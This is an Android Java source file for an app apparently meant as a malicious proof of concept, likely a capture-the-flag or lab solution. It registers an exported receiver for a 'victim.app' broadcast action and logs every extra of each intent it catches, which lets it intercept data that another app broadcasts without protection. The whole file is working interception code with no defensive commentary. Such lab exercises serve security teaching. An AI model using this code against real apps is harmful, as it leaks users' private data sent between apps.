package com.example.maliciousapp;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import java.util.Iterator;
import java.util.Set;

public class justlisten extends AppCompatActivity {

    private MyBroadcastReceiver receiver;

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_justlisten);

        // Initialize receiver
        receiver = new MyBroadcastReceiver();
        // Register the receiver with an intent filter
        IntentFilter filter = new IntentFilter("victim.app.FLAG_ANNOUNCEMENT");
        registerReceiver(receiver, filter,RECEIVER_EXPORTED);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        // Unregister the receiver to prevent memory leaks
        if (receiver != null) {
            unregisterReceiver(receiver);
        }
    }


}

class MyBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if ("victim.app.FLAG_ANNOUNCEMENT".equals(intent.getAction())) {
            dumpIntent(intent);
        }
    }

    @SuppressLint("RestrictedApi")
    public static void dumpIntent(Intent i){

        Bundle bundle = i.getExtras();
        if (bundle != null) {
            Set<String> keys = bundle.keySet();
            Iterator<String> it = keys.iterator();
            Log.e("INTENT","Dumping Intent start");
            while (it.hasNext()) {
                String key = it.next();
                Log.e("INTENT","" + key + "=" + bundle.get(key)+"");
            }
            Log.e("INTENT","Dumping Intent end");
        }
    }
}